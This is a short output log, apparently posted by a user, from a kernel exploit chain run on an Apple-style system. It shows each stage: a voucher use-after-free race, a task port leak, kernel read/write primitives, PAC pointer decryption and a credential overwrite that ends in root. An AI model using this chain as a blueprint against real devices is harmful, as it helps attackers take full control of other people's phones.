@sbtoonz 2021-03-05
Stage 1: race for voucher ivace uaf
perform_user_data_element_uaf_race: success on 154 iteration
uafed_voucher: 8239
Stage 2: leak task port address and overlapped index
Got fake element dump!
Overlapped index: 0
Cannot find next spray entry
perform_user_data_element_uaf_race: success on 83 iteration
uafed_voucher: 10331
Stage 2: leak task port address and overlapped index
Got fake element dump!
Overlapped index: 1009
Next spray index: 30
task_port: 0xffffffe1a13e28b0
Stage 3: Convert uaf into pktopts uaf
Respray fake user_data_element
Destroy uafed voucher...
Established custom r/w primitives!
Stage 4 (DEMO): pwn kernel
task PAC: 0xb6829de1a140ebf8
PAC decrypt: 0xb6829de1a140ebf8 -> 0xffffffe1a140ebf8
proc PAC: 0x65e9cbe1a1390430
PAC decrypt: 0x65e9cbe1a1390430 -> 0xffffffe1a1390430
ucred PAC: 0x55831061a10b79f0
PAC decrypt: 0x55831061a10b79f0 -> 0xffffffe1a10b79f0
Overwriting kernel credentials :)
getuid() returns 0
whoami: root
Out.

Drastically reduced runtime